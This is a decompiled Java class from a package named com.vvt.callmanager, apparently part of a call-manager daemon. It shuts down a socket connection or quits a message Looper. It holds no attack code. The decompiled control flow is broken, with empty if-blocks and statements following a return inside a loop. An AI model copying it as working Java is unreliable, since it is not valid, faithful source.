package com.vvt.callmanager;

import android.os.Looper;
import java.util.concurrent.Callable;

class b
  implements Callable
{
  b(CallMgrDaemonMain paramCallMgrDaemonMain) {}
  
  public Void a()
  {
    Object localObject = this.a;
    boolean bool = CallMgrDaemonMain.b((CallMgrDaemonMain)localObject);
    if (bool) {}
    localObject = CallMgrDaemonMain.c(this.a);
    if (localObject != null)
    {
      localObject = this.a;
      bool = CallMgrDaemonMain.b((CallMgrDaemonMain)localObject);
      if (bool) {}
      localObject = CallMgrDaemonMain.c(this.a);
      ((com.fx.socket.b)localObject).a();
    }
    for (;;)
    {
      localObject = this.a;
      bool = CallMgrDaemonMain.b((CallMgrDaemonMain)localObject);
      if (bool) {}
      return null;
      localObject = CallMgrDaemonMain.d(this.a);
      if (localObject != null)
      {
        localObject = this.a;
        bool = CallMgrDaemonMain.b((CallMgrDaemonMain)localObject);
        if (bool) {}
        localObject = CallMgrDaemonMain.d(this.a);
        ((Looper)localObject).quit();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/b.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */